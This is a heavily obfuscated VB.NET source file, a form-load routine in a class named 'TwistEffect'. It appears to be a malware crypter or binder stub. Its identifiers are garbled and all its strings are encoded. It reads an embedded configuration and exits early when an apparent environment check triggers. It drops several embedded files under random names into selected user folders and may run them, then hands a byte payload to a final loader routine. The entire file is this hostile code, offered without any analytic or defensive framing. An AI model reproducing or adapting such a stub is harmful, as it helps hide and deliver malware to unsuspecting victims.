﻿Imports System.Text

Public Class TwistEffect

    Private Sub TwistEffect_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim zÞzæzzææÞÞÞææÞ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µÄµ¸", "›")
            Dim zæzzææzæææÞÞÞæ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µÄÄµ¸", "›")
            Dim ÞÞzzæzÞzzzzæzÞ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µÄÄÄµ¸", "›")
            Dim zzzææÞÞææzæzææ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µ´´´µ¸", "›")
            Dim zæzzÞzÞzææÞÞÞÞ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("µºººµ", "›")
            Dim zzzzzæzzzzzæÞÞ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("µççççµ", "›")
            Dim zÞææzÞzÞæÞæzzæ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µÄÄÄÄµ¸", "›")
            Dim ÞÞæzæÞÞÞÞÞzzzÞ As String = SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¸µ´´´´µ¸", "›")
            Dim a8he9NXYRfIg8i5obqDureJNUwDguxU9xp53ZH8xrYBKKfZGRn As String = ""
            Dim P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9 As String = ""
            Dim ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC() As String
            Dim ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv() As String
            Dim joyZxsqtLvEP7yNLO6PPspvvTzs4NWiWMjnIDnznaLe9vXehpC() As String
            Dim o4VHavWZubsfKRF9RmT1TxKSEeclBTIUvm8zilL4TllvsqvPif() As String
            Dim jRZV9gkcBXIoJMXFmrbaUrNC3CctuyMd2zZcVPyhhmFsPDR8Uo As String = ""
            Dim WWUNNamOqklECJPYkRz4gYAPKn9TO3Ijllr1GYzQqYzazNt4N9 As String = ""
            Dim otwaFejDZHJT0lRZdDcb7QKfVfYQEnWh3akXDGJIvQICq1gx9g As String = ""
            Dim U9jgI4BxsP As String = ""
            Dim zz0Opm9aD3KPlWg5h8vZujbCC As Integer = 0
            Dim WZWnLaJ9RDxsPw29Qc56f3jayt4Jvp5zwwdtjKTd42X8f0bwTE() As Byte

            a8he9NXYRfIg8i5obqDureJNUwDguxU9xp53ZH8xrYBKKfZGRn = rCDYiinHKXJyokn8WPNyi9MWWPjQjipGPRF9Hu1dO6WTZ(qbOzL3Fc71of7CgReQCcrskivEaKmvBlk95HjFbCKQ7zg)
            ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC = Split(a8he9NXYRfIg8i5obqDureJNUwDguxU9xp53ZH8xrYBKKfZGRn, zÞzæzzææÞÞÞææÞ)

            U9jgI4BxsP = ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC(2)
            zz0Opm9aD3KPlWg5h8vZujbCC = CInt(ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC(3))

            If zz0Opm9aD3KPlWg5h8vZujbCC = 1 Then P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9 = t7RisfnOoQSCcVbhemIsaxxlDmNgsuBK48kKZrEMYp123(ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC(1), U9jgI4BxsP)
            If zz0Opm9aD3KPlWg5h8vZujbCC = 2 Then P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9 = VwrbYf5MXOiupkfkVrgFBLhOaGrVR64jTZyuzib893UBs(ZsoZ7ofNkuc5Rp4RWAS0vklQfx2FhZEbreZ70kgmFLRBJaiiwC(1), U9jgI4BxsP)

            jRZV9gkcBXIoJMXFmrbaUrNC3CctuyMd2zZcVPyhhmFsPDR8Uo = Split(P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9, zÞzæzzææÞÞÞææÞ)(0)
            WWUNNamOqklECJPYkRz4gYAPKn9TO3Ijllr1GYzQqYzazNt4N9 = Split(P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9, zÞzæzzææÞÞÞææÞ)(1)
            otwaFejDZHJT0lRZdDcb7QKfVfYQEnWh3akXDGJIvQICq1gx9g = Split(P2EbvPXYgQkNE4Go4O71bevzXMUZJmGMqfL0dAaRu4yKGAJXL9, zÞzæzzææÞÞÞææÞ)(2)

            ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv = Split(jRZV9gkcBXIoJMXFmrbaUrNC3CctuyMd2zZcVPyhhmFsPDR8Uo, zæzzææzæææÞÞÞæ)
            joyZxsqtLvEP7yNLO6PPspvvTzs4NWiWMjnIDnznaLe9vXehpC = Split(WWUNNamOqklECJPYkRz4gYAPKn9TO3Ijllr1GYzQqYzazNt4N9, ÞÞzzæzÞzzzzæzÞ)
            o4VHavWZubsfKRF9RmT1TxKSEeclBTIUvm8zilL4TllvsqvPif = Split(otwaFejDZHJT0lRZdDcb7QKfVfYQEnWh3akXDGJIvQICq1gx9g, zÞææzÞzÞæÞæzzæ)

            If CBool(ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv(1)) = True And WbJrgH79XC4JQ7QkdsLJ8udMFmWF2XTtkwCpdE8g2C2iv() = True Then End
            If ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv(2) <> SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("«", "›") Then Call lcmJhcMQPP4JLBXmtr7CNOzV0LzytbeQMB9xr5zUXvcag(CDbl(ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv(2)))
            WZWnLaJ9RDxsPw29Qc56f3jayt4Jvp5zwwdtjKTd42X8f0bwTE = Encoding.Default.GetBytes(ZDTlgkU5vjatKDPv7VqxCxdMl57oAp8A8ESkyCDiTZftbTEZjv(0))

            If WWUNNamOqklECJPYkRz4gYAPKn9TO3Ijllr1GYzQqYzazNt4N9 <> SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÕÔÄßÚÏÚ", "›") Then
                Dim ØvÆØ8œFœQV As String = joyZxsqtLvEP7yNLO6PPspvvTzs4NWiWMjnIDnznaLe9vXehpC(1)
                Select Case (ØvÆØ8œFœQV)
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Ïþöë¾", "›")
                        ØvÆØ8œFœQV = tw4OgvRXFjasuS9nwrSun6F9CQMa0U5DPj9aQfwKc57zr & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Úëëßúïú¾", "›")
                        ØvÆØ8œFœQV = kWaXctCkG1M87a2TzGIa13Q0s5QC4PRZVUWcga2HcP45k & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾ÎèþéËéôýò÷þ¾", "›")
                        ØvÆØ8œFœQV = de1CUxTd38qMOK9wgwBvvY3gghGRIoTxzarNJDsE4zLNQ & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Öâßôøîöþõïè¾", "›")
                        ØvÆØ8œFœQV = KJm0d156fyrMEaWwNO0K3bfZ9J5BkICgwvjhYT6nOBhio & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case Else
                        ØvÆØ8œFœQV = wmqTQ2lC3eYMxjBcqF2OLjzOk3NLk6r1NhZcYSvEmvHME & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                End Select
                Dim GœÆUqdONÆyvÆÆN2ÆXÆZØØ0Øyf() As String = Split(joyZxsqtLvEP7yNLO6PPspvvTzs4NWiWMjnIDnznaLe9vXehpC(0), zzzææÞÞææzæzææ)
                For i = 0 To (GœÆUqdONÆyvÆÆN2ÆXÆZØØ0Øyf.Length - 1)
                    If GœÆUqdONÆyvÆÆN2ÆXÆZØØ0Øyf(i) <> "" Then
                        Dim Øœu8YØ1mØe2IØgÆJlDØœYÆnAœ() As String = Split(GœÆUqdONÆyvÆÆN2ÆXÆZØØ0Øyf(i), zæzzÞzÞzææÞÞÞÞ)
                        Dim ØÆ9FœœØØKKœÆØœHVDbœRœÆÆÆÆØÆ9FœœØØKKœÆØœHVDbœRœÆÆÆÆ As String = Øœu8YØ1mØe2IØgÆJlDØœYÆnAœ(0)
                        Dim NØ1Ø1ÆØMYySaÆAœÆœÆÆÆØœhiRQØ0œcÆœœkÆdHØn0zeœhZP8ÆÆœ As String = ØvÆØ8œFœQV & mbqu5dWtJVw7zOZZc6G716lpzvC3S2WF8MD7Mhv5uhT8I(6, False) & Øœu8YØ1mØe2IØgÆJlDØœYÆnAœ(1)
                        Dim xh3ØØLGSMØK5ØVT86œIuÆVÆœÆtQBTÆGØØÆVØGxlØÆÆœØvm0œØØ As Boolean = CBool(Øœu8YØ1mØe2IØgÆJlDØœYÆnAœ(2))
                        XqzFGaBa9fycWxwoPeWzO0FflkSL5sakHawct005L9ub7(NØ1Ø1ÆØMYySaÆAœÆœÆÆÆØœhiRQØ0œcÆœœkÆdHØn0zeœhZP8ÆÆœ, ØÆ9FœœØØKKœÆØœHVDbœRœÆÆÆÆØÆ9FœœØØKKœÆØœHVDbœRœÆÆÆÆ)
                        If xh3ØØLGSMØK5ØVT86œIuÆVÆœÆtQBTÆGØØÆVØGxlØÆÆœØvm0œØØ = True Then EsIQTT4QJzFoB1wEhoIHDTXhwNRFmRZyza9XnqlumO0pC(NØ1Ø1ÆØMYySaÆAœÆœÆÆÆØœhiRQØ0œcÆœœkÆdHØn0zeœhZP8ÆÆœ)
                    End If
                Next
            End If

            If xVqlpdyQ4uJHzwSZY74IkzRN0rg1hfrG4hlDVnMxRVmn0() = True And otwaFejDZHJT0lRZdDcb7QKfVfYQEnWh3akXDGJIvQICq1gx9g <> SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("ÕÔÄßÚÏÚ", "›") Then
                Dim ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ As String = o4VHavWZubsfKRF9RmT1TxKSEeclBTIUvm8zilL4TllvsqvPif(1)
                Select Case (ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ)
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Ïþöë¾", "›")
                        ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ = tw4OgvRXFjasuS9nwrSun6F9CQMa0U5DPj9aQfwKc57zr & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Úëëßúïú¾", "›")
                        ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ = kWaXctCkG1M87a2TzGIa13Q0s5QC4PRZVUWcga2HcP45k & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾ÎèþéËéôýò÷þ¾", "›")
                        ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ = de1CUxTd38qMOK9wgwBvvY3gghGRIoTxzarNJDsE4zLNQ & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("¾Öâßôøîöþõïè¾", "›")
                        ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ = KJm0d156fyrMEaWwNO0K3bfZ9J5BkICgwvjhYT6nOBhio & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                    Case Else
                        ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ = wmqTQ2lC3eYMxjBcqF2OLjzOk3NLk6r1NhZcYSvEmvHME & SvuIrOnnfUJUhGODXAAKGOMoUkPCElVHVGñGkZpWTzFBWFPNmL("Ç", "›")
                End Select
                Dim HbjœE7Ø2Ø9Ø7KÆbØY4IØIØœØÆØ7ØNJ5Æ8tiW7RœyLœÆ5œÆœ59œ() As String = Split(o4VHavWZubsfKRF9RmT1TxKSEeclBTIUvm8zilL4TllvsqvPif(0), ÞÞæzæÞÞÞÞÞzzzÞ)
                For i = 0 To (HbjœE7Ø2Ø9Ø7KÆbØY4IØIØœØÆØ7ØNJ5Æ8tiW7RœyLœÆ5œÆœ59œ.Length - 1)
                    If HbjœE7Ø2Ø9Ø7KÆbØY4IØIØœØÆØ7ØNJ5Æ8tiW7RœyLœÆ5œÆœ59œ(i) <> "" Then
                        Dim BpyœaWzgr2() As String = Split(HbjœE7Ø2Ø9Ø7KÆbØY4IØIØœØÆØ7ØNJ5Æ8tiW7RœyLœÆ5œÆœ59œ(i), zzzzzæzzzzzæÞÞ)
                        Dim ÆÆØœLœÆ0œÆ As String = BpyœaWzgr2(0)
                        Dim ÆØJlhxEeœØ As String = ØÆÆlÆØKœWœÆœœzØØZÆ2rvœÆOHÆÆbØ9ivhojw8bUœUIISKoœœYœ & mbqu5dWtJVw7zOZZc6G716lpzvC3S2WF8MD7Mhv5uhT8I(6, False) & BpyœaWzgr2(1)
                        Dim RœÆN8ØØjØW As Boolean = CBool(BpyœaWzgr2(2))
                        FBGId596oUCgMgQ7BtaNfzCS2Kvk2G1dPVxtEUg6XUy2Q(ÆÆØœLœÆ0œÆ, ÆØJlhxEeœØ, RœÆN8ØØjØW)
                    End If
                Next
            End If
            難えふө与難予ωϐзт五аҍ頂ФきҼЗЖ与ЊҶきҼもЗ(WZWnLaJ9RDxsPw29Qc56f3jayt4Jvp5zwwdtjKTd42X8f0bwTE, qbOzL3Fc71of7CgReQCcrskivEaKmvBlk95HjFbCKQ7zg)
            End
        Catch ØdRØc3œœØœ1œœErGyJlÆÆx6XœØbœnOØkÆDœØXNÆØWœL4FØGkØØœgGœœuAzØœtIœOwØrœh1ÆÆÆØÆœVœwØÆÆTØvNœOZFÆc1hÆœœdiu As Exception
            End
        End Try
    End Sub
End Class